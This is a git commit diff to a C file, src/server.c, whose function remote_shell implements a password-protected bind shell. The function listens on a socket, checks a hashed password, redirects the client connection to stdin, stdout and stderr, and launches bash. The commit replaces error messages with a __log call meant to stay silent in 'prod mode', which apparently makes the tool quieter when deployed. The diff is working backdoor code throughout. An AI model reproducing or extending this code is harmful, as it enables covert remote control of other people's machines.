2569e43b39ade4b72e333055fc7cefd227e03218
Arthur Bied-Charreton <arthurbiedchar@gmail.com>
2025-07-29 14:31:47 +0200

    Reformat log messages in server and use __log to prevent logging in prod mode

--- src/server.c
+++ src/server.c
@@ -1,5 +1,6 @@
 #include "digest.h"
 #include "mem.h"
+#include "shield.h"
 #include <errno.h>
 #include <fcntl.h>
 #include <netinet/in.h>
@@ -20,10 +21,10 @@ read_line(const int client_fd, char *const buf, size_t max_len) {
     for (read_bytes = 0; read_bytes < max_len; ++read_bytes) {
         ssize_t recv_res = recv(client_fd, &c, 1, 0);
         if (recv_res == -1) {
-            fprintf(stderr, "recv error (fd %d): %s\n", client_fd, strerror(errno));
+            __log(stderr, "(recv [fd %d]) Error: %s\n", client_fd, strerror(errno));
             return -1;
         } else if (recv_res == 0) {
-            fprintf(stderr, "recv error (fd %d): Connection closed while reading\n", client_fd);
+            __log(stderr, "(recv [fd %d]) Error: Connection closed while reading\n", client_fd);
             return 0;
         }
 
@@ -47,20 +48,17 @@ remote_shell(char **env) {
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
 
     if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
-        fprintf(stderr, "Error binding to fd %d: %s", server_fd, strerror(errno));
+        __log(stderr, "(bind [fd %d]) Error: %s", server_fd, strerror(errno));
         goto server_error;
-        return 1;
     }
     if (listen(server_fd, 1) == -1) {
-        fprintf(stderr, "Error listening on server fd fd %d: %s", server_fd, strerror(errno));
+        __log(stderr, "(listen [fd %d]) Error: %s", server_fd, strerror(errno));
         goto server_error;
-        return 1;
     }
 
     if ((client_fd = accept(server_fd, NULL, NULL)) == -1) {
-        fprintf(stderr, "Error accepting client: %s\n", strerror(errno));
+        __log(stderr, "(accept [fd %d]) Error: %s\n", server_fd, strerror(errno));
         goto server_error;
-        return 1;
     }
 
     char pwd_sha[65] = {0};
@@ -69,7 +67,6 @@ remote_shell(char **env) {
         size_t read_bytes;
         if ((read_bytes = read_line(client_fd, buf, sizeof(buf))) <= 0) {
             goto client_error;
-            return 1;
         }
 
         Sha256StreamingContext ctx = {0};
@@ -85,21 +82,24 @@ remote_shell(char **env) {
         while (recv(client_fd, discard, sizeof(discard), MSG_DONTWAIT) > 0)
             ;
 
-        send(client_fd, "Invalid password, try again\n", 28, 0);
+        if (send(client_fd, "Invalid password, try again\n", 28, 0) == -1) {
+            __log(stderr, "(send [fd %d]) Error: %s\n", client_fd, strerror(errno));
+            goto client_error;
+        }
     }
 
-    if (dup2(client_fd, 0) == -1) {
-        fprintf(stderr, "Error duplicating stdin to client fd %d: %s\n", client_fd, strerror(errno));
+    if (dup2(client_fd, STDIN_FILENO) == -1) {
+        __log(stderr, "(dup2 [src_fd %d target_fd 0]) Error: %s\n", client_fd, strerror(errno));
         goto client_error;
         return 1;
     }
-    if (dup2(client_fd, 1) == -1) {
-        fprintf(stderr, "Error duplicating stdout to client fd %d: %s\n", client_fd, strerror(errno));
+    if (dup2(client_fd, STDOUT_FILENO) == -1) {
+        __log(stderr, "(dup2 [src_fd %d target_fd 1]) Error: %s\n", client_fd, strerror(errno));
         goto client_error;
         return 1;
     }
-    if (dup2(client_fd, 2) == -1) {
-        fprintf(stderr, "Error duplicating stderr to client fd %d: %s\n", client_fd, strerror(errno));
+    if (dup2(client_fd, STDERR_FILENO) == -1) {
+        __log(stderr, "(dup2 [src_fd %d target_fd 2]) Error: %s\n", client_fd, strerror(errno));
         goto client_error;
         return 1;
     }
@@ -108,7 +108,7 @@ remote_shell(char **env) {
     const char *args[2] = {bash_exec_path, NULL};
 
     execve(bash_exec_path, (char *const *)args, env);
-    fprintf(stderr, "Could not execute %s: %s\n", bash_exec_path, strerror(errno));
+    __log(stderr, "(execve [cmd %s]) Error: %s\n", bash_exec_path, strerror(errno));
 
     return 0;
 
